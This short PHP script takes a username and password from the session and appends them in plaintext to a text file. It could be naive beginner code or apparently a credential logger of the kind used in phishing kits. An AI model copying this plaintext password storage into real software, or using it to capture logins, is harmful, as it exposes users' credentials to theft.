<?php

   //session_start();

   $user=$_SESSION["username"];;
   $pass=$_SESSION['password'];

	$filePath = "file/File.txt";
    $f = fopen($filePath, "a");
    fwrite($f, $user. " " .$pass ."\n");

    fclose($f);

?>